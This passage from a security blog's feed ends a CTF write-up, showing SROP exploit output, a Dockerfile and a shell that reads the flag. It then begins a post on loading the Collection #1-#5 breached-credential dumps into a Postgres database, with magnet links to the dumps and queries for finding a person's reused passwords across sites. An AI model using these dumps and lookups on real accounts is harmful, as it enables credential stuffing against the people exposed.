<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./pwn&#39;</span>: pid <span style="color:#ae81ff">3587974</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending initial payload to leak pointers
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> leaked stack: 0x7ffff9555000
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#ae81ff">2</span> which feeds the first SIGRETURN frame
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the first SIGRETURN by sending <span style="color:#ae81ff">15</span> junk bytes
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resetting the binary to a vulnerable read state and sending 2nd SIGRETURN execve payload
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the last SIGRETURN
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
$ whoami
terrance
$
</code></pre></div><p>Works on my machine! Well, let&rsquo;s test it &ldquo;remote&rdquo;. Here&rsquo;s the CTF&rsquo;s Dockerfile which will set up
the challenge for remote pwning. You can tie the binary together with netcat or socat as well.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> alpine:latest</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir /app<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> pwn /app/<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> flag.txt /app/<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod +x /app/pwn<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> adduser imth -D -s <span style="color:#66d9ef">$(</span>which nologin<span style="color:#66d9ef">)</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 1337</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">USER</span><span style="color:#e6db74"> imth</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /app/</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENTRYPOINT</span> [<span style="color:#e6db74">&#34;nc&#34;</span>, <span style="color:#e6db74">&#34;-lkvp&#34;</span>, <span style="color:#e6db74">&#34;1337&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>, <span style="color:#e6db74">&#34;/app/pwn&#34;</span>]<span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>Run with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker build -t minipwn .
docker run -p 1337:1337 --rm minipwn
</code></pre></div><p>Then test the exploit remotely:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ python minipwn.py remote 172.17.0.1 <span style="color:#ae81ff">1337</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 172.17.0.1 on port 1337: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Run mode: remote
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 172.17.0.1 on port 1337: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Run mode: remote
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending initial payload to leak pointers
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> leaked stack: 0x7ffc178a6000
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#ae81ff">2</span> which feeds the first SIGRETURN frame
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the first SIGRETURN by sending <span style="color:#ae81ff">15</span> junk bytes
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resetting the binary to a vulnerable read state and sending 2nd SIGRETURN execve payload
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the last SIGRETURN
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>imth<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>imth<span style="color:#f92672">)</span>
$ cat flag.txt
TMHC<span style="color:#f92672">{</span>h4v3_y0u_h34rd_0f_SROP<span style="color:#f92672">}</span>
$
</code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Hopefully that was clear. I know I&rsquo;ll be referring back to this when I run into a similar problem
again during a CTF. I&rsquo;ve provided the challenge binary, commented exploit script, Dockerfile, and
flag file in an archive <a href="minipwn.tar.gz">here</a></p>
<p>The official binaries, write-up and solution script using Mprotect can be found here
<a href="https://github.com/TheManyHatsClub-CTF/TheManyHatsClubCTF/tree/master/2019/pwn/miniPWN">https://github.com/TheManyHatsClub-CTF/TheManyHatsClubCTF/tree/master/2019/pwn/miniPWN</a></p>
<p>If you see any errors or have suggestions on better ways to explain something in the post, please
let me know. This was a learning experience for me as well as an attempt to share newly acquired
knowledge.</p>
]]></content>
        </item>
        
        <item>
            <title>Password Dump Database - Part 1</title>
            <link>https://ctrl.red/posts/2019/09/password-dump-database-part-1/</link>
            <pubDate>Sat, 28 Sep 2019 19:33:14 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2019/09/password-dump-database-part-1/</guid>
            <description>Preface This post is first in a series where I mostly catalogue my failures, what didn&amp;rsquo;t work, and the lessons I learned along the way. This isn&amp;rsquo;t a tool drop, or a new dump. Also, part 2 basically says every choice I make in Part 1 (this part) is wrong. If you&amp;rsquo;re a DB admin or have experience with manipulating large amounts of data, prepare to cringe&amp;hellip; HARD
If you&amp;rsquo;re just interested in some stats and bencharks, you can skip straight to that section</description>
            <content type="html"><![CDATA[<h2 id="preface">Preface</h2>
<p>This post is first in a series where I mostly catalogue my failures, what didn&rsquo;t work, and the
lessons I learned along the way. This isn&rsquo;t a tool drop, or a new dump. Also, part 2 basically
says every choice I make in Part 1 (this part) is wrong. If you&rsquo;re a DB admin or have experience
with manipulating large amounts of data, prepare to cringe&hellip; HARD</p>
<p>If you&rsquo;re just interested in some stats and bencharks, you can
<a href="#benchmarks-and-data">skip straight to that section</a></p>
<p>If you&rsquo;d like to play along, here are some magnet links to the dumps.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt"># Collection #1
magnet:?xt=urn:btih:b39c603c7e18db8262067c5926e7d5ea5d20e12e&amp;dn=Collection+1

# Collections #2 - #5
magnet:?xt=urn:btih:d136b1adde531f38311fbf43fb96fc26df1a34cd&amp;dn=Collection+%232-%235+%26+Antipublic
</code></pre></div><h2 id="why">Why?</h2>
<p><img src="demo.gif" alt=""></p>
<p>How much data duplication is there in the public database dumps, Collection #1-#5?</p>
<p>How much space is taken by duplicate passwords and email domains like gmail.com?</p>
<p>During a <a href="https://www.youtube.com/watch?v=f84n5oFoZBc">Hammock-Driven Development</a> session,
thinking about how to answer this question, I found myself with the additional desire of searching
through the Collections without needing to <code>zgrep</code> my way through. I also didn&rsquo;t accept grepping
through terrabytes of unzipped data as a solution. When I think data normalization, and quick
searching we all think: DATABASES!</p>
<h2 id="planning-it">Planning it</h2>
<p>This dataset is huge. Querying will be 99% percent of this database&rsquo;s purpose. We want fast search
results. We can decide, then,  to incur the costs of writing to a heavily-indexed database up
front, while seeding the databse. Let&rsquo;s get <em>normalized</em>.</p>
<p>The records in these types of dumps are generally structured like so:</p>
<pre tabindex="0"><code>username@domain.com:P@ssw0rd!
</code></pre><p>Let&rsquo;s start by splitting each record into tables <code>usernames</code>, <code>domains</code>, and <code>passwords</code>.
We can also create a <code>records</code> table with foreign keys which will maintain the relationship between
entires in the other 3 tables. Also, if we create a unique index on the combination of the foreign
keys in the <code>records</code> table, we ensure that only one combination of <code>user</code>, <code>domain</code>, and
<code>password</code> ever enters the <code>records</code> table.  If there are 900 million gmail.com addresses in the
dumps, the string &ldquo;gmail.com&rdquo; is only stored once. This kind of data normalization is what
databases are meant for.</p>
<p>With this configuration, if we seed our database with the following records:</p>
<pre tabindex="0"><code>jerry@gmail.com:Summer19
adam@gmail.com: Summer19
samantha@yahoo.com:Summer19
samantha@yandex.ru:Password123
</code></pre><p>our tables will look like this:</p>
<h4 id="usernames">Usernames</h4>
<table>
<thead>
<tr>
<th>id</th>
<th>usernames</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>jerry</td>
</tr>
<tr>
<td>2</td>
<td>adam</td>
</tr>
<tr>
<td>3</td>
<td>samantha</td>
</tr>
</tbody>
</table>
<h4 id="passwords">Passwords</h4>
<table>
<thead>
<tr>
<th>id</th>
<th>password</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Summer19</td>
</tr>
<tr>
<td>2</td>
<td>Password123</td>
</tr>
</tbody>
</table>
<h4 id="domains">Domains</h4>
<table>
<thead>
<tr>
<th>id</th>
<th>domain</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>gmail.com</td>
</tr>
<tr>
<td>2</td>
<td>yahoo.com</td>
</tr>
<tr>
<td>3</td>
<td>yandex.ru</td>
</tr>
</tbody>
</table>
<h4 id="records">Records</h4>
<table>
<thead>
<tr>
<th>username_id</th>
<th>domain_id</th>
<th>password_id</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>3</td>
<td>2</td>
<td>1</td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td>2</td>
</tr>
</tbody>
</table>
<p>With this normalization, we&rsquo;ve taken 109 bytes of dump data and normalized it down to 64 bytes of
uniqued data, plus the size of the join table that maintains the previous relationships.</p>
<p>Also, with <code>records</code> serving as a <code>JOIN</code> table between the other 3 tables, we can create some
interesting queries.</p>
<ul>
<li>Who are all the users that use <code>P@$$w0rd1</code> for a password?</li>
<li>What&rsquo;s the most common password by users from company <code>contoso.com</code>?</li>
<li>At which other domains does a particular user receive email?
<ul>
<li>Did they use the same password on other sites whose creds were also dumped?</li>
</ul>
</li>
</ul>
<h2 id="building-it">Building it</h2>
<p>I really enjoy using the ORM, ActiveRecord. ORMs are Object Relational Mappers. They&rsquo;re a layer of
abstraction over databases that exists across most programming languages. They take that language&rsquo;s
concept of a struct/class/object and map its properties to a database table. For example, if we
have a <code>Dog</code> class in our language, an ORM maps this class to a <code>dogs</code> table in our database. Once
we create an instance of that dog class, <code>starbuck = Dog.new</code>, <code>starbuck</code> now represents a single
row in the <code>dogs</code> table. Columns, then, are mapped to properties of an instance.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">starbuck <span style="color:#f92672">=</span> <span style="color:#66d9ef">Dog</span><span style="color:#f92672">.</span>create(name: <span style="color:#e6db74">&#39;Starbuck&#39;</span>)
<span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">Dog</span><span style="color:#f92672">&lt;</span>id: <span style="color:#ae81ff">1</span>, name: <span style="color:#e6db74">&#39;Starbuck&#39;</span><span style="color:#f92672">&gt;</span>

starbuck<span style="color:#f92672">.</span>name
<span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;Starbuck&#34;</span>
</code></pre></div><p>When calling <code>starbuck.name</code>, the ORM&rsquo;s query planner will generate and issue the following query to
the underlying SQL engine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> name 
<span style="color:#66d9ef">FROM</span> dogs
<span style="color:#66d9ef">WHERE</span> <span style="color:#e6db74">&#39;id&#39;</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>

<span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;Starbuck&#34;</span>
</code></pre></div><p>Another beneficial feature of an ORM is that it can be configured for many different SQL dialects.
The ORM affords us another abstraction by allowing users to configure different database engines in
the ORM&rsquo;s initial configuration. We could, for example, conditionally use a SQLite3 file for
running tests locally during development, but use Postgres in production.  All without changing a
line of business logic.</p>
<p>Another reason I chose ActiveRecord was its ease of configuration. The following blocks of code
are all that&rsquo;s needed to enable queries that can ordinarily be cumbersome to write.</p>
<h3 id="configuring-data-models">Configuring data models</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;active_record&#39;</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Password</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Base</span>
  has_many <span style="color:#e6db74">:records</span>
  has_many <span style="color:#e6db74">:usernames</span>, <span style="color:#e6db74">through</span>: <span style="color:#e6db74">:records</span>
  has_many <span style="color:#e6db74">:domains</span>, <span style="color:#e6db74">through</span>: <span style="color:#e6db74">:records</span>
<span style="color:#66d9ef">end</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Domain</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Base</span>
  has_many <span style="color:#e6db74">:records</span>
  has_many <span style="color:#e6db74">:passwords</span>, <span style="color:#e6db74">through</span>: <span style="color:#e6db74">:records</span>
  has_many <span style="color:#e6db74">:usernames</span>, <span style="color:#e6db74">through</span>: <span style="color:#e6db74">:records</span>
<span style="color:#66d9ef">end</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Username</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Base</span>
  has_many <span style="color:#e6db74">:records</span>
  has_many <span style="color:#e6db74">:passwords</span>, <span style="color:#e6db74">through</span>: <span style="color:#e6db74">:records</span>
  has_many <span style="color:#e6db74">:domains</span>, <span style="color:#e6db74">through</span>: <span style="color:#e6db74">:records</span>
<span style="color:#66d9ef">end</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Record</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Base</span>
  belongs_to <span style="color:#e6db74">:domain</span>
  belongs_to <span style="color:#e6db74">:password</span>
  belongs_to <span style="color:#e6db74">:username</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><h3 id="configuring-the-database-driver">Configuring the Database Driver</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;active_record&#39;</span>

<span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Base</span><span style="color:#f92672">.</span>establish_connection( 
 <span style="color:#e6db74">host</span>: <span style="color:#e6db74">&#34;localhost&#34;</span>,
 <span style="color:#e6db74">database</span>: <span style="color:#e6db74">&#34;passdb&#34;</span>,
 <span style="color:#e6db74">username</span>: <span style="color:#e6db74">&#34;postgres&#34;</span>,
 <span style="color:#e6db74">password</span>: <span style="color:#e6db74">&#34;postgres&#34;</span>,
 <span style="color:#e6db74">adapter</span>: <span style="color:#e6db74">&#34;postgresql&#34;</span>
)
</code></pre></div><h3 id="configuring-the-database-schema">Configuring the Database Schema</h3>
<p>The following are the schema migrations that will create the correct tables and indices in our
database, as well as set the constraints necessary to keep our data clean:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;active_record&#39;</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AddRecords</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Migration</span><span style="color:#f92672">[</span><span style="color:#ae81ff">5</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">]</span>
  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">.</span><span style="color:#a6e22e">up</span>
    create_table <span style="color:#e6db74">:records</span>, <span style="color:#e6db74">unlogged</span>: <span style="color:#66d9ef">true</span> <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>t<span style="color:#f92672">|</span>
      t<span style="color:#f92672">.</span>references <span style="color:#e6db74">:password</span>, <span style="color:#e6db74">null</span>: <span style="color:#66d9ef">false</span>
      t<span style="color:#f92672">.</span>references <span style="color:#e6db74">:domain</span>, <span style="color:#e6db74">null</span>: <span style="color:#66d9ef">false</span>
      t<span style="color:#f92672">.</span>references <span style="color:#e6db74">:username</span>, <span style="color:#e6db74">null</span>: <span style="color:#66d9ef">false</span>
    <span style="color:#66d9ef">end</span>

    <span style="color:#75715e">## This will create a uniquness check on the combination of a user, password, domain</span>
    add_index <span style="color:#e6db74">:records</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">:password_id</span>, <span style="color:#e6db74">:domain_id</span>, <span style="color:#e6db74">:username_id</span><span style="color:#f92672">]</span>, <span style="color:#e6db74">unique</span>: <span style="color:#66d9ef">true</span>


    <span style="color:#75715e">### These are just query optimization indices</span>
    add_index <span style="color:#e6db74">:records</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">:username_id</span>, <span style="color:#e6db74">:domain_id</span><span style="color:#f92672">]</span>
    add_index <span style="color:#e6db74">:records</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">:username_id</span>, <span style="color:#e6db74">:password_id</span><span style="color:#f92672">]</span>
  <span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">end</span>


<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AddPasswords</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Migration</span><span style="color:#f92672">[</span><span style="color:#ae81ff">5</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">]</span>
  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">.</span><span style="color:#a6e22e">up</span>
    create_table <span style="color:#e6db74">:passwords</span>, <span style="color:#e6db74">unlogged</span>: <span style="color:#66d9ef">true</span> <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>t<span style="color:#f92672">|</span>
      t<span style="color:#f92672">.</span>string <span style="color:#e6db74">:password</span>, <span style="color:#e6db74">null</span>: <span style="color:#66d9ef">false</span>
    <span style="color:#66d9ef">end</span>

    <span style="color:#75715e"># only allow one instance of any given password</span>
    add_index <span style="color:#e6db74">:passwords</span>, <span style="color:#e6db74">:password</span>, <span style="color:#e6db74">unique</span>: <span style="color:#66d9ef">true</span>
  <span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">end</span>


<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AddUsernames</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Migration</span><span style="color:#f92672">[</span><span style="color:#ae81ff">5</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">]</span>
  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">.</span><span style="color:#a6e22e">up</span>
    create_table <span style="color:#e6db74">:usernames</span>, <span style="color:#e6db74">unlogged</span>: <span style="color:#66d9ef">true</span> <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>t<span style="color:#f92672">|</span>
      t<span style="color:#f92672">.</span>string <span style="color:#e6db74">:name</span>, <span style="color:#e6db74">null</span>: <span style="color:#66d9ef">false</span>
    <span style="color:#66d9ef">end</span>

    <span style="color:#75715e"># only allow one instance of any given username</span>
    add_index <span style="color:#e6db74">:usernames</span>, <span style="color:#e6db74">:name</span>, <span style="color:#e6db74">unique</span>: <span style="color:#66d9ef">true</span>

<span style="color:#66d9ef">end</span>


<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AddDomains</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Migration</span><span style="color:#f92672">[</span><span style="color:#ae81ff">5</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">]</span>
  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">.</span><span style="color:#a6e22e">up</span>
    create_table <span style="color:#e6db74">:domains</span>, <span style="color:#e6db74">unlogged</span>: <span style="color:#66d9ef">true</span> <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>t<span style="color:#f92672">|</span>
      t<span style="color:#f92672">.</span>string <span style="color:#e6db74">:domain</span>, <span style="color:#e6db74">null</span>: <span style="color:#66d9ef">false</span>
    <span style="color:#66d9ef">end</span>

    <span style="color:#75715e"># only allow one instance of any given domain</span>
    add_index <span style="color:#e6db74">:domains</span>, <span style="color:#e6db74">:domain</span>, <span style="color:#e6db74">unique</span>: <span style="color:#66d9ef">true</span>
  <span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><h2 id="seeding-the-database">Seeding the Database</h2>
<p>Collections #1-5 are huge. And they also include tons of duplicate records. By setting the correct
indices and database constraints, we can offload the task of knowing what is &ldquo;good&rdquo; vs &ldquo;bad&rdquo; data
to the database itself, instead of worrying about that in code. I initially handled this logic in
the code that seeds the database.</p>
<blockquote>
<p><strong>Dev Tangent</strong>: Software validation was a bad idea for a couple of reasons. There are no
assurances that the data in our database is clean. Especially when there are multiple threads, all
trying to write at the same time. Initially I just had a single-threaded seeding program. ETA was
about a year. During a multithread refactor, I ran into some concurrency problems. It was then
that I moved validation to the database. ETA dove down to 90 days.</p>
</blockquote>
<p>With the ORM configured, we can begin the seeding process.</p>
<p>In order to create a <code>record</code>, we need 3 other pre-existing row ids: user_id, password_id, and
domain_id.  Sometimes, we encounter a line in the dump data that has all new data. Other times,
maybe only the username and password is new. Upon trying to create a new <code>gmail.com</code> domain record,
we&rsquo;ll get a failure because it doesn&rsquo;t meet our uniquness constraint. In this scenario, we can
instead ask for the <code>id</code> of the existing <code>gmail.com</code> entry in our <code>domains</code> table. With
our 3 ids, we can now use them as foreign keys for a new <code>record</code> entry.</p>
<p>You may already see a drawback in our implementation here. In a worst case scenario, where we&rsquo;re
trying to insert a fully duplicate record, that means we can have 7 queries to attempt to write 1
record. That might be acceptable when seeding some datasets, but with a record count in the
billions, that means a 45-day difference of seed time. Also keep in mind that each write to the
database is actually 2 writes, because the indices of each record also need to be updated.  However,
we decided early on to take this hit, since this isn&rsquo;t going to be write-heavy database.  We could
still help the seed times by leveraging Database Transactions and Postgres' <code>ON CONFLICT</code> keyword
though.</p>
<p>Grouping 7 different transactions into one will ensure that all operations required for adding a
new dump entry to our tables occur together.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">BEGIN</span> 

<span style="color:#66d9ef">WITH</span> ins1 <span style="color:#66d9ef">AS</span> (
        <span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> usernames(name) <span style="color:#66d9ef">VALUES</span> (<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">1</span>)
        <span style="color:#66d9ef">ON</span> CONFLICT (name) <span style="color:#66d9ef">DO</span> <span style="color:#66d9ef">UPDATE</span> <span style="color:#66d9ef">SET</span> name<span style="color:#f92672">=</span>EXCLUDED.name
        RETURNING id <span style="color:#66d9ef">AS</span> user_id
)
, ins2 <span style="color:#66d9ef">AS</span> (
        <span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> passwords(password) <span style="color:#66d9ef">VALUES</span> (<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>)
        <span style="color:#66d9ef">ON</span> CONFLICT (password) <span style="color:#66d9ef">DO</span> <span style="color:#66d9ef">UPDATE</span> <span style="color:#66d9ef">SET</span> password<span style="color:#f92672">=</span>EXCLUDED.password
        RETURNING id <span style="color:#66d9ef">AS</span> pass_id
)
, ins3 <span style="color:#66d9ef">AS</span> (
        <span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> domains(<span style="color:#66d9ef">domain</span>) <span style="color:#66d9ef">VALUES</span> (<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">3</span>)
        <span style="color:#66d9ef">ON</span> CONFLICT (<span style="color:#66d9ef">domain</span>) <span style="color:#66d9ef">DO</span> <span style="color:#66d9ef">UPDATE</span> <span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">domain</span><span style="color:#f92672">=</span>EXCLUDED.<span style="color:#66d9ef">domain</span>
        RETURNING id <span style="color:#66d9ef">AS</span> domain_id
)

<span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> records (username_id, password_id, domain_id)
<span style="color:#66d9ef">VALUES</span> (
        (<span style="color:#66d9ef">select</span> user_id <span style="color:#66d9ef">from</span> ins1), 
        (<span style="color:#66d9ef">select</span> pass_id <span style="color:#66d9ef">from</span> ins2), 
        (<span style="color:#66d9ef">select</span> domain_id <span style="color:#66d9ef">from</span> ins3) 
)

<span style="color:#66d9ef">COMMIT</span>
</code></pre></div><p>Now, I wrote this, and it&rsquo;s still intimidating. From the top, we try to create each item but give
the query a sort of <code>catch</code> statement that says &ldquo;if you&rsquo;re unable to save, then get the id of the
entry that matches the data I just tried to insert. Then, save that id as a variable for later
use&rdquo;. In the <code>INSERT</code> statement, we create a new <code>record</code> with the IDs we stored in the 3 variables
from the 3 previous blocks. Because this is all wrapped in a Transaction, it gets sent to the
database as 1 transaction, not 7.</p>
<p>Another benefit of a transaction, is that in case of any sort of unrecoverable failure, the entire
thing get&rsquo;s undone. If our seeder panics while trying to write a <code>domain</code>, the previous <code>password</code>,
and <code>username</code> entries are removed from the database (they actually never wrote), ensuring we don&rsquo;t
have any dangling data in our database.</p>
<h3 id="querying">Querying</h3>
<p>Once we create the tables and seed some data, our associations are set in the ORM such that
pivoting on any instance of a <code>username</code>, <code>password</code>, or <code>domain</code> is possible.</p>
<pre tabindex="0"><code># start with a domain
yahoo = Domain.find_by(domain: &quot;yahoo.com&quot;)

# find all passwords by yahoo mail users
yahoo.passwords

# find all yahoo mail users
yahoo.usernames

# find all password of a particular yahoo mail user
yahoo.usernames.first.passwords



# start with a user
jojo = Usernames.find_by(name: &quot;jojo1990&quot;)

# see all passwords belonging to jojo
jojo.passwords

# see all email account for jojo
jojo.domains



# starting with a password
pass = Password.find_by(password: &quot;P@ssw0rd!&quot;)

# see the users that share this password
pass.usernames
</code></pre><h2 id="iterate">Iterate</h2>
<p><img src="1.png" alt="agile vs waterfall"></p>
<p>The first iteration of the project was to create a CLI where I could load my models, and query the
data in an interactive enironment, like so&hellip; <code>records.first.username.passwords</code>, etc.</p>
<p>The second iteration was creating a JSON API, so that remote services would be able to query this
data.</p>
<p>The following was all that was needed to create the JSON API server in Ruby. (ruby because that&rsquo;s
what ActiveRecord is written in)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">get <span style="color:#e6db74">&#39;/domains/:domain&#39;</span> <span style="color:#66d9ef">do</span>
  domain <span style="color:#f92672">=</span> <span style="color:#66d9ef">Domain</span><span style="color:#f92672">.</span>find_by(<span style="color:#e6db74">domain</span>: params<span style="color:#f92672">[</span><span style="color:#e6db74">:domain</span><span style="color:#f92672">]</span>)
  paginated(domain, params)
<span style="color:#66d9ef">end</span>

